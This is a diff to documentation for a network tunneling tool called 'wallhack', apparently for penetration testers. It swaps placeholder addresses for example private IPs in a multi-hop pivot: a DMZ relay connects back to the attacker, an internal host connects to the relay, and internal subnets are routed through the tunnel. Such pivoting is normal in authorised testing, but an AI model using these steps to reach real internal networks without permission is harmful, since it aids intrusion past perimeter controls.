@@ -6,7 +6,7 @@ order: 8
 
 # Multi-Hop
 
-When deeper targets cannot reach the entry node directly, chain through intermediate relays to extend reach.
+Some targets sit behind a host that can reach your machine, but the target itself cannot. A relay in the middle bridges the gap — the DMZ host (`10.0.1.10`) connects out to your machine (`10.0.0.5`) and listens inward for the next hop.
 
 {% steps %}
 {% step title="Attacker (Entry)" number=1 %}
@@ -16,26 +16,25 @@ Listen for the first hop.
 {% /step %}
 
 {% step title="DMZ Host (Relay)" number=2 %}
-Connect to the entry node and listen for the next hop.
+Connect to the attacker and listen for the next hop.
 
-{% codeblock code="./wallhack relay --connect ATTACKER_IP:443 --listen :6565" /%}
+{% codeblock code="./wallhack relay --connect 10.0.0.5:443 --listen :6565" /%}
 {% /step %}
 
 {% step title="Internal Host (Exit)" number=3 %}
 Connect back to the relay.
 
-{% codeblock code="./wallhack exit --connect DMZ_IP:6565" /%}
+{% codeblock code="./wallhack exit --connect 10.0.1.10:6565" /%}
 {% /step %}
 
 {% step title="Configure Routes" number=4 %}
-Route target networks through the tunnel.
+Route the internal networks through the tunnel.
 
 ```bash
-ip route add 10.0.0.0/24 dev tun0
-ip route add 10.1.0.0/24 dev tun0
-ip route add 10.2.0.0/24 dev tun0
+ip route add 192.168.1.0/24 dev tun0
+ip route add 192.168.2.0/24 dev tun0
 ```
 {% /step %}
 {% /steps %}
 
-{% trafficflow flow="Your machine -> DMZ host -> Internal host -> Target (10.2.0.0/24)" label="Traffic Flow:" /%}
+{% trafficflow flow="10.0.0.5 (you) -> 10.0.1.10 (DMZ) -> internal host -> 192.168.1.0/24, 192.168.2.0/24" label="Traffic Flow:" /%}
